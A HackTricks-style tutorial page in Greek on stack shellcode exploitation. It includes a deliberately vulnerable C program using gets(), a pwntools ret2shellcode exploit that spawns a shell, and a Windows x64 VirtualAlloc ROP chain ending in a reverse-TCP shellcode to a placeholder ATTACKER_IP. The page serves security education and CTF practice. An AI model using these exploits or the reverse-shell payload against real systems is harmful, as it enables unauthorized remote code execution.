# Stack Shellcode

{{#include ../../../banners/hacktricks-training.md}}

## Βασικές Πληροφορίες

**Stack shellcode** είναι μια τεχνική που χρησιμοποιείται στο **binary exploitation**, όπου ένας attacker γράφει shellcode στη στοίβα ενός ευάλωτου προγράμματος και στη συνέχεια τροποποιεί τον **Instruction Pointer (IP)** ή τον **Extended Instruction Pointer (EIP)** ώστε να δείχνει στη θέση αυτού του shellcode, προκαλώντας την εκτέλεσή του. Αυτή είναι μια κλασική μέθοδος που χρησιμοποιείται για να αποκτήσει μη εξουσιοδοτημένη πρόσβαση ή να εκτελέσει arbitrary commands σε ένα σύστημα-στόχο. Εδώ ακολουθεί μια ανάλυση της διαδικασίας, συμπεριλαμβανομένου ενός απλού παραδείγματος σε C και του πώς θα μπορούσατε να γράψετε ένα αντίστοιχο exploit χρησιμοποιώντας Python με **pwntools**.

### Παράδειγμα C: Ένα Ευάλωτο Πρόγραμμα

Ας ξεκινήσουμε με ένα απλό παράδειγμα ενός ευάλωτου C προγράμματος:
```c
#include <stdio.h>
#include <string.h>

void vulnerable_function() {
char buffer[64];
gets(buffer); // Unsafe function that does not check for buffer overflow
}

int main() {
vulnerable_function();
printf("Returned safely\n");
return 0;
}
```
Αυτό το πρόγραμμα είναι ευάλωτο σε buffer overflow λόγω της χρήσης της συνάρτησης `gets()`.

### Compilation

Για να μεταγλωττίσετε αυτό το πρόγραμμα ενώ απενεργοποιείτε διάφορες προστασίες (για να προσομοιώσετε ένα ευάλωτο περιβάλλον), μπορείτε να χρησιμοποιήσετε την ακόλουθη εντολή:
```sh
gcc -m32 -fno-stack-protector -z execstack -no-pie -o vulnerable vulnerable.c
```
- `-fno-stack-protector`: Απενεργοποιεί την προστασία του stack.
- `-z execstack`: Κάνει το stack εκτελέσιμο, κάτι που είναι απαραίτητο για την εκτέλεση του shellcode που είναι αποθηκευμένο στο stack.
- `-no-pie`: Απενεργοποιεί το Position Independent Executable, κάνοντας πιο εύκολο τον υπολογισμό της διεύθυνσης μνήμης όπου θα βρίσκεται το shellcode μας.
- `-m32`: Μεταγλωττίζει το πρόγραμμα ως 32-bit εκτελέσιμο, συχνά χρησιμοποιείται για απλότητα στην ανάπτυξη exploits.

### Python Exploit using Pwntools

Ακολουθεί πώς μπορείτε να γράψετε ένα exploit σε Python χρησιμοποιώντας **pwntools** για να πραγματοποιήσετε μια επίθεση **ret2shellcode**:
```python
from pwn import *

# Set up the process and context
binary_path = './vulnerable'
p = process(binary_path)
context.binary = binary_path
context.arch = 'i386' # Specify the architecture

# Generate the shellcode
shellcode = asm(shellcraft.sh()) # Using pwntools to generate shellcode for opening a shell

# Find the offset to EIP
offset = cyclic_find(0x6161616c) # Assuming 0x6161616c is the value found in EIP after a crash

# Prepare the payload
# The NOP slide helps to ensure that the execution flow hits the shellcode.
nop_slide = asm('nop') * (offset - len(shellcode))
payload = nop_slide + shellcode
payload += b'A' * (offset - len(payload))  # Adjust the payload size to exactly fill the buffer and overwrite EIP
payload += p32(0xffffcfb4) # Supossing 0xffffcfb4 will be inside NOP slide

# Send the payload
p.sendline(payload)
p.interactive()
```
Αυτό το script κατασκευάζει ένα payload που αποτελείται από ένα **NOP slide**, το **shellcode**, και στη συνέχεια υπεργράφει το **EIP** με τη διεύθυνση που δείχνει στο NOP slide, διασφαλίζοντας ότι το shellcode θα εκτελεστεί.

Το **NOP slide** (`asm('nop')`) χρησιμοποιείται για να αυξήσει την πιθανότητα ότι η εκτέλεση θα «γλιστρήσει» στο shellcode μας ανεξάρτητα από την ακριβή διεύθυνση. Προσαρμόστε το όρισμα `p32()` στη διεύθυνση εκκίνησης του buffer σας συν ένα offset ώστε να προσγειωθείτε στο NOP slide.

## Windows x64: Bypass NX with VirtualAlloc ROP (ret2stack shellcode)

Σε σύγχρονα Windows η στοίβα είναι μη εκτελέσιμη (DEP/NX). Ένας συνηθισμένος τρόπος για να εκτελέσετε shellcode που βρίσκεται στη στοίβα μετά από stack BOF είναι να φτιάξετε μια 64-bit ROP chain που καλεί την VirtualAlloc (ή VirtualProtect) από το module Import Address Table (IAT) για να κάνει μια περιοχή της στοίβας εκτελέσιμη και στη συνέχεια να επιστρέψει στο shellcode που ακολουθεί την αλυσίδα.

Σημεία-κλειδιά (Win64 calling convention):
- VirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect)
- RCX = lpAddress → επιλέξτε μια διεύθυνση στην τρέχουσα στοίβα (π.χ., RSP) ώστε η νεοδεσμευμένη περιοχή RWX να επικαλύπτει το payload σας
- RDX = dwSize → αρκετά μεγάλη για την αλυσίδα + shellcode σας (π.χ., 0x1000)
- R8  = flAllocationType = MEM_COMMIT (0x1000)
- R9  = flProtect = PAGE_EXECUTE_READWRITE (0x40)
- Επιστρέψτε απευθείας στο shellcode τοποθετημένο αμέσως μετά την αλυσίδα.

Ελάχιστη στρατηγική:
1) Leak μια βάση module (π.χ., μέσω format-string, object pointer, κ.λπ.) για να υπολογίσετε τις απόλυτες διευθύνσεις των gadgets και του IAT υπό ASLR.
2) Βρείτε gadgets για να φορτώσετε RCX/RDX/R8/R9 (pop ή mov/xor-based sequences) και ένα call/jmp [VirtualAlloc@IAT]. Αν δεν έχετε άμεσα pop r8/r9, χρησιμοποιήστε arithmetic gadgets για να συνθέσετε σταθερές (π.χ., θέστε r8=0 και επαναλάβετε προσθήκη r9=0x40 σαράντα φορές για να φτάσετε 0x1000).
3) Τοποθετήστε stage-2 shellcode αμέσως μετά την αλυσίδα.

Παράδειγμα διάταξης (εννοιολογικό):
```
# ... padding up to saved RIP ...
# R9 = 0x40 (PAGE_EXECUTE_READWRITE)
POP_R9_RET; 0x40
# R8 = 0x1000 (MEM_COMMIT) — if no POP R8, derive via arithmetic
POP_R8_RET; 0x1000
# RCX = &stack (lpAddress)
LEA_RCX_RSP_RET    # or sequence: load RSP into a GPR then mov rcx, reg
# RDX = size (dwSize)
POP_RDX_RET; 0x1000
# Call VirtualAlloc via the IAT
[IAT_VirtualAlloc]
# New RWX memory at RCX — execution continues at the next stack qword
JMP_SHELLCODE_OR_RET
# ---- stage-2 shellcode (x64) ----
```
Με ένα περιορισμένο σύνολο gadgets, μπορείτε να κατασκευάσετε τιμές καταχωρητών έμμεσα, για παράδειγμα:
- mov r9, rbx; mov r8, 0; add rsp, 8; ret → ορίζει το r9 από το rbx, μηδενίζει το r8 και αντισταθμίζει το stack με ένα junk qword.
- xor rbx, rsp; ret → γεμίζει το rbx με τον τρέχοντα stack pointer.
- push rbx; pop rax; mov rcx, rax; ret → μεταφέρει τιμή προερχόμενη από RSP στο RCX.

Παράδειγμα Pwntools (δεδομένη μια γνωστή base και gadgets):
```python
from pwn import *
base = 0x7ff6693b0000
IAT_VirtualAlloc = base + 0x400000  # example: resolve via reversing
rop  = b''
# r9 = 0x40
rop += p64(base+POP_RBX_RET) + p64(0x40)
rop += p64(base+MOV_R9_RBX_ZERO_R8_ADD_RSP_8_RET) + b'JUNKJUNK'
# rcx = rsp
rop += p64(base+POP_RBX_RET) + p64(0)
rop += p64(base+XOR_RBX_RSP_RET)
rop += p64(base+PUSH_RBX_POP_RAX_RET)
rop += p64(base+MOV_RCX_RAX_RET)
# r8 = 0x1000 via arithmetic if no pop r8
for _ in range(0x1000//0x40):
rop += p64(base+ADD_R8_R9_ADD_RAX_R8_RET)
# rdx = 0x1000 (use any available gadget)
rop += p64(base+POP_RDX_RET) + p64(0x1000)
# call VirtualAlloc and land in shellcode
rop += p64(IAT_VirtualAlloc)
rop += asm(shellcraft.amd64.windows.reverse_tcp("ATTACKER_IP", ATTACKER_PORT))
```
Συμβουλές:
- VirtualProtect λειτουργεί παρόμοια αν προτιμάται να κάνετε ένα υπάρχον buffer RX· η σειρά των παραμέτρων είναι διαφορετική.
- Αν ο χώρος στο stack είναι περιορισμένος, εκχωρήστε RWX αλλού (RCX=NULL) και κάντε jmp σε αυτή τη νέα περιοχή αντί να επαναχρησιμοποιήσετε το stack.
- Πάντοτε λαμβάνετε υπόψη gadgets που προσαρμόζουν το RSP (π.χ., add rsp, 8; ret) εισάγοντας junk qwords.


- [**ASLR**](../../common-binary-protections-and-bypasses/aslr/index.html) **πρέπει να απενεργοποιηθεί** για να είναι η διεύθυνση αξιόπιστη ανάμεσα στις εκτελέσεις ή η διεύθυνση όπου θα αποθηκευτεί η συνάρτηση δεν θα είναι πάντα η ίδια και θα χρειαστείτε κάποιο leak για να καταλάβετε πού φορτώνεται η win function.
- [**Stack Canaries**](../../common-binary-protections-and-bypasses/stack-canaries/index.html) θα πρέπει επίσης να απενεργοποιηθούν, αλλιώς η παραβιασμένη διεύθυνση επιστροφής του EIP δεν θα ακολουθηθεί ποτέ.
- [**NX**](../../common-binary-protections-and-bypasses/no-exec-nx.md) **stack** protection θα αποτρέψει την εκτέλεση του shellcode μέσα στο stack επειδή αυτή η περιοχή δεν θα είναι εκτελέσιμη.

## Άλλα Παραδείγματα & Αναφορές

- [https://ir0nstone.gitbook.io/notes/types/stack/shellcode](https://ir0nstone.gitbook.io/notes/types/stack/shellcode)
- [https://guyinatuxedo.github.io/06-bof_shellcode/csaw17_pilot/index.html](https://guyinatuxedo.github.io/06-bof_shellcode/csaw17_pilot/index.html)
- 64bit, ASLR με leak διεύθυνσης stack, γράψτε shellcode και κάντε jump σε αυτό
- [https://guyinatuxedo.github.io/06-bof_shellcode/tamu19_pwn3/index.html](https://guyinatuxedo.github.io/06-bof_shellcode/tamu19_pwn3/index.html)
- 32 bit, ASLR με leak στο stack, γράψτε shellcode και κάντε jump σε αυτό
- [https://guyinatuxedo.github.io/06-bof_shellcode/tu18_shellaeasy/index.html](https://guyinatuxedo.github.io/06-bof_shellcode/tu18_shellaeasy/index.html)
- 32 bit, ASLR με leak στο stack, σύγκριση για να αποτραπεί η κλήση στο exit(), αντικατάσταση μιας μεταβλητής με μια τιμή και γράψτε shellcode και κάντε jump σε αυτό
- [https://8ksec.io/arm64-reversing-and-exploitation-part-4-using-mprotect-to-bypass-nx-protection-8ksec-blogs/](https://8ksec.io/arm64-reversing-and-exploitation-part-4-using-mprotect-to-bypass-nx-protection-8ksec-blogs/)
- arm64, χωρίς ASLR, ROP gadget για να κάνει το stack εκτελέσιμο και να κάνει jump στο shellcode στο stack


## Αναφορές

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE)](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [VirtualAlloc documentation](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)

{{#include ../../../banners/hacktricks-training.md}}
